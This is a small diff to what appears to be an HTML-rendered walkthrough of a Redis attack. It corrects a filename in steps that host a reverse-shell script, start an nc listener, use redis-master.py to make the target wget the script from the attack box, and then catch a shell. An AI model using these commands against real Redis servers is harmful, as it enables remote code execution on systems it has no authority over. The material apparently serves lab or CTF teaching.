@@ -94,7 +94,7 @@ python3 <span class="nt">-m</span> http.server &lt;attack box HTTP port&gt;
 rlwrap nc <span class="nt">-lvnp</span> &lt;attack box listener port&gt;
 
 <span class="c"># Download the revshell.pl file from target:</span>
-./redis-master.py <span class="nt">-r</span> &lt;target IP&gt; <span class="nt">-p</span> &lt;target redis port, 6379 by default&gt; <span class="nt">-L</span> &lt;attack box ip&gt; <span class="nt">-P</span> &lt;attack box redis port, 6379 by default&gt; <span class="nt">-f</span> module.so <span class="nt">-c</span> <span class="s1">'wget http://&lt;attack box IP&gt;:&lt;attack box HTTP port&gt;/revperl.pl'</span>
+./redis-master.py <span class="nt">-r</span> &lt;target IP&gt; <span class="nt">-p</span> &lt;target redis port, 6379 by default&gt; <span class="nt">-L</span> &lt;attack box ip&gt; <span class="nt">-P</span> &lt;attack box redis port, 6379 by default&gt; <span class="nt">-f</span> module.so <span class="nt">-c</span> <span class="s1">'wget http://&lt;attack box IP&gt;:&lt;attack box HTTP port&gt;/revshell.pl'</span>
 
 <span class="c"># Execute the reverse shell script from target.</span>
 <span class="c"># You should catch a shell on your listener:</span>
